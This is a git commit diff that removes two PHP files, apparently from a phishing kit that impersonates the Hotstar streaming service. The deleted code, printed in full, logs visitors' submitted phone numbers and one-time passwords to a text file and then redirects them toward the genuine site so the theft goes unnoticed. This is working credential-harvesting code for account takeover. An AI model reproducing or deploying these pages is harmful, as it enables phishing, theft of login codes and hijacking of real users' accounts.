dc03a1732566a2db2b8fb6a0cd9c71cccd04b8b3
kasroudra2 <kasroudrakrd@gmail.com>
2022-09-25 11:44:45 +0600

    Removed hotstar

--- login_hotstar/login.php
+++
@@ -1,6 +0,0 @@
-<?php
-file_put_contents("usernames.txt", "OTP: " . $_POST['OTP'] . "\n", FILE_APPEND);
-$url = "redirectUrl"; # https://www.hotstar.com/in
-header("Location: $url");
-exit();
-?>
--- login_hotstar/user.login.php
+++
@@ -1,5 +0,0 @@
-<?php
-file_put_contents("usernames.txt", "Hotstar Number: " . $_POST['phoneNo'] . "\n", FILE_APPEND);
-header('Location: otp.login.php');
-exit();
-?>
